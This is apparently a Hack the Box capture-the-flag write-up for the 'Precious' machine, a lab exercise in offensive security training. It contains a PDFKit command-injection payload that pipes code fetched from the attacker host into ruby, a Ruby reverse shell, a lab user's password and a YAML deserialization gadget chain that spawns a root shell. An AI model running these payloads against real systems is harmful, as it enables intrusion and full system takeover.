---
title: "HTB • Precious"
tags:
  - "Linux"
  - "Web"
  - "Easy Difficulty"
  - "Intermediate"
  - "CVE"
  - "Ruby"
  - "Sudo"
excerpt: "Precious is an easy linux machine on Hack the Box that involves web exploitation, CVEs, Ruby programs, and sudo exploitation. Some vulnerable or misconfigured products featured on this machine include Ruby Programming Language and PDFKit"
categories:
  - "Writeups"
  - "Hack the Box Machines"
img_path: "/assets/img/post/htb-machines-precious/"
---

Precious is an easy linux machine created by [**Nauten**](https://app.hackthebox.com/users/27582) on [**Hack the Box**](https://app.hackthebox.com/machines/Precious) that features a web server that uses a version of **PDFKit** that is vulnerable to **CVE-2022-25765**, which can be exploited to execute commands as the user _ruby_. Within this user's home directory we find a folder containing a configuration file with the credentials for another user by the name of _henry_. As _henry_, we can run a particular script as root via the `sudo` command. This script is vulnerable to a form of YAML deserialization, which leads us to code execution as _root_.

## Initial Recon

Let's first set up our environment and run a TCP port scan with [this custom nmap wrapper](https://github.com/bryanmcnulty/ctf-scripts/blob/main/recon/active/ctf-portscan.sh).

```bash
# bryan@attacker
rhost="10.10.11.189" # Target IP address
lhost="10.10.14.4" # Your VPN IP address
echo rhost=$rhost >> .env
echo lhost=$lhost >> .env
. ./.env && ctfscan $rhost
```
{:.nolineno}

The open TCP ports reported in the scan include:

| Port | Service | Product | Version                |
|:-----|:--------|:--------|:-----------------------|
| 22   | SSH     | OpenSSH | 8.4p1 Debian 5+deb11u1 |
| 80   | HTTP    | nginx   | 1.18.0                 |

The scan also reports that port 80 responds with a redirection to [http://precious.htb/](http://precious.htb/). Let's add this hostname to our `/etc/hosts`{:.filepath} file.

```bash
# bryan@attacker
echo 'vhost=("precious.htb")' >> .env && . ./.env
echo -e "$rhost\\t$vhost" | sudo tee -a /etc/hosts
```
{:.nolineno}

## Web

We'll begin by visiting [http://precious.htb/](http://precious.htb/) in our favorite browser.

![Home page](homepage.png)
_The main web index_

The page apparently has some functionality that will convert the content at a given URL to a PDF document.

### PDF Generator

Upon sending a dummy URL through the web form, we observe a request from our browser with BurpSuite.

![Convert Request](request.png)

The request just passes the submitted URL to the server. Let's test this functionality on our own HTTP server.

```bash
# bryan@attacker
mkdir share && cd share
echo '<p>Hello!</p>' > index.html
python3 -m http.server --bind $lhost 8080
```
{:.nolineno}
```bash
# bryan@attacker
curl -d "url=http://$lhost:8080/" http://precious.htb/ -o response.bin
```
{:.nolineno}

We get a request to our HTTP server and subsequently receive the PDF result.

```bash
# bryan@attacker
file response.bin # The response body is a PDF document
xdg-open response.bin # Open the document
```
{:.nolineno}

The document contains the text "Hello!", which is expected because that is the content we had on our site earlier. Checking the metadata of the document with `exiftool`, we find out that the _Creator_ field mentions that the document was generated using a product identified as **PDFKit v0.8.6**.

#### CVE-2022-25765

After some research, we determine that this version of _pdfkit_ is vulnerable to CVE-2022-25765, meaning we could potentially inject OS commands as explained [here](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795). Let's try exploiting the bug to establish a reverse shell session with [PwnCat](https://github.com/calebstewart/pwncat). We'll use a reverse shell written in Ruby because we know that Ruby is installed since PDFKit is written in Ruby.

```bash
# bryan@attacker
mkdir -p share && cd share
rb="require 'socket';spawn('sh',[:in,:out,:err]=>TCPSocket.new('$lhost',8443))"
echo "$rb" > index.html # Write ruby reverse shell to web index
python3 -m http.server --bind $lhost 8080 &>/dev/null & # Serve payload
pwncat-cs -m linux -l $lhost 8443 # PwnCat listener | Install: `pip3 install pwncat-cs`
```
{:.nolineno}

```bash
# bryan@attacker
curl precious.htb -d "url=http://%2520%60curl%20$lhost:8080|ruby%60" # Trigger payload
```
{:.nolineno}

Once we trigger the payload, Our PwnCat handler gets a callback and stabilizes the shell.

## Privilege Escalation

### Ruby

Our reverse shell session is in the context of the user _ruby_. In this user's home directory, we find the file `~/.bundle/config`{:.filepath} which contains potential credentials.

```bash
# ruby@precious.htb (PwnCat)
find ~ -type f # We find a configuration file of sorts
cat ~/.bundle/config # Let's read it
```
{:.nolineno}

The user _henry_, associated with the password `Q3c1AqGHtoI0aXAYFH`, is also present on the current machine with the same password.

```bash
# bryan@attacker
pwncat-cs ssh://henry@precious.htb # password is Q3c1AqGHtoI0aXAYFH
```
{:.nolineno}

### Henry

As _henry_, we can execute a specific command as root via `sudo`.

```bash
# henry@precious.htb (SSH)
sudo -l
```
{:.nolineno}
>
```
User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```
{:.nolineno}

Let's take a look at this script and see what it does.

```ruby
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
```
{:file="/opt/update_dependencies.rb"}

This script doesn't do much besides calling `YAML.load` on the content of the file `dependencies.yml`{:.filepath} from our working directory. When looking into vulnerabilities affecting `YAML.load`, we discover that it is not safe to use with user supplied data. We also run into [this wonderful post](https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/) that describes a gadget chain we could potentially use to execute commands as _root_. We'll modify the command within the YAML payload from the post to spawn an interactive root shell.

```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "bash -pi"
         method_id: :resolve
```
{:file="dependencies.yml"}

Now with the YAML payload `dependencies.yml`{:.filepath} in our working directory, we execute the vulnerable script with sudo

```bash
# henry@precious.htb (SSH)
sudo /usr/bin/ruby /opt/update_dependencies.rb # trigger the payload
```
{:.nolineno}

The command successfully spawns a root shell, from which we can read the final flag at `/root/root.txt`{:.filepath}

#### Alternative Solution

Another way we could get the root flag is by using the script at `/opt/update_dependencies.rb`{:.filepath} to read files through a symlink. When the script looks for `dependencies.yml`{:.filepath} in the working directory, it will find a planted symlink that will point to `/root/root.txt`{:.filepath}. When the script tries to parse the file as YAML, it will display an error containing the file contents.

```bash
# henry@precious.htb (SSH)
cd $(mktemp -d)
ln -s /root/root.txt ./dependencies.yml # create symlink
sudo /usr/bin/ruby /opt/update_dependencies.rb # read /root/root.txt
```
{:.nolineno}
